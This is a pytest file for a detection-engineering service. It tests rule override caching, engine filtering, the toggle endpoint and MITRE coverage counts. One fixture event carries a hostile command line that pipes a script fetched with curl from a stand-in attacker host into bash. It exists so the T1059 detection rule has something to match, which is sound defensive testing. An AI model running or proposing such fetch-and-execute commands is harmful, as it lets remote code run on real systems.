"""
test_rule_overrides.py — detection rule runtime overrides + MITRE coverage (v2.12.0).

Covers: override service TTL cache + invalidation, engine skipping
override-disabled rules, disable-only semantics for file-disabled rules,
and coverage aggregation honoring overrides.
"""
from unittest.mock import patch

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.models import Base, DetectionRuleOverride
from app.services import rule_override_service as ros

_engine = create_engine(
    "sqlite:///:memory:",
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
Base.metadata.create_all(_engine)
_Session = sessionmaker(bind=_engine)

# A real, file-enabled rule id from detection/rules (T1059 shell+network tool).
REAL_RULE_ID = "linux_t1059_shell_network_tool"


def _db():
    db = _Session()
    db.query(DetectionRuleOverride).delete()
    db.commit()
    ros.invalidate_cache()
    return db


def test_set_and_get_disabled_ids_with_cache_invalidation():
    db = _db()
    assert ros.get_disabled_rule_ids(db) == set()

    ros.set_rule_enabled(db, "rule-a", False, updated_by="admin")
    db.commit()
    # set_rule_enabled invalidates, so the next read sees it despite the TTL
    assert ros.get_disabled_rule_ids(db) == {"rule-a"}

    ros.set_rule_enabled(db, "rule-a", True, updated_by="admin")
    db.commit()
    assert ros.get_disabled_rule_ids(db) == set()
    db.close()


def test_cache_serves_stale_until_invalidated():
    db = _db()
    assert ros.get_disabled_rule_ids(db) == set()
    # Write a row directly (no invalidate) — cached empty set is returned.
    db.add(DetectionRuleOverride(rule_id="rule-b", enabled=False))
    db.commit()
    assert ros.get_disabled_rule_ids(db) == set()
    ros.invalidate_cache()
    assert ros.get_disabled_rule_ids(db) == {"rule-b"}
    db.close()


def test_engine_skips_override_disabled_rules():
    from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

    engine = YAMLDetectionEngine()
    # Same fixture event the engine tests use (matches the sample T1059 rule).
    sample_id = "linux_t1059_shell_network_tool_sample"
    event = {
        "process": {
            "name": "bash",
            "command_line": "curl http://evil.com/s.sh | bash",
            "parent": {"name": "sshd"},
        },
        "user": {"name": "root"},
        "host": {"name": "test"},
    }
    baseline = engine.evaluate_event(event, include_disabled=True)
    matched = {c.rule_id for c in baseline if c.matched}
    assert sample_id in matched, f"fixture event no longer matches {sample_id}: {matched}"

    filtered = engine.evaluate_event(event, include_disabled=True, disabled_rule_ids={sample_id})
    assert sample_id not in {c.rule_id for c in filtered}


def test_toggle_endpoint_semantics():
    from fastapi import HTTPException
    from app.routers.rules import toggle_rule

    db = _db()

    class _Req:
        client = None
        state = type("S", (), {"user": {"username": "admin", "role": "admin"}})()

    # Unknown rule → 404
    with pytest.raises(HTTPException) as exc:
        toggle_rule("no-such-rule", _Req(), db)
    assert exc.value.status_code == 404

    # Real rule: first toggle disables, second re-enables
    out = toggle_rule(REAL_RULE_ID, _Req(), db)
    assert out["effective_enabled"] is False
    assert REAL_RULE_ID in ros.get_disabled_rule_ids(db)
    out = toggle_rule(REAL_RULE_ID, _Req(), db)
    assert out["effective_enabled"] is True
    assert REAL_RULE_ID not in ros.get_disabled_rule_ids(db)

    # File-disabled rules cannot be toggled (detection-as-code wins)
    from app.routers import rules as rules_router
    real_rules, _ = rules_router._load_rules()
    file_disabled = next((r for r in real_rules if not r.enabled), None)
    if file_disabled is not None:
        with pytest.raises(HTTPException) as exc:
            toggle_rule(file_disabled.id, _Req(), db)
        assert exc.value.status_code == 400
    db.close()


def test_coverage_aggregation_honors_overrides():
    from app.routers.rules import _coverage

    db = _db()
    cov = _coverage(db)
    assert cov["total_rules"] >= 5
    assert cov["covered_tactics"] >= 1
    all_techs = {t["id"]: t for tac in cov["tactics"] for t in tac["techniques"]}
    assert any(t["enabled_rules"] > 0 for t in all_techs.values())

    # Disable the T1059 rule — its technique's enabled count must drop.
    tech_before = next(t for tac in _coverage(db)["tactics"] for t in tac["techniques"]
                       if t["id"].startswith("T1059"))
    ros.set_rule_enabled(db, REAL_RULE_ID, False, updated_by="admin")
    db.commit()
    tech_after = next(t for tac in _coverage(db)["tactics"] for t in tac["techniques"]
                      if t["id"] == tech_before["id"])
    assert tech_after["enabled_rules"] == tech_before["enabled_rules"] - 1
    assert tech_after["rules"] == tech_before["rules"]  # still listed — honest "paused"
    db.close()
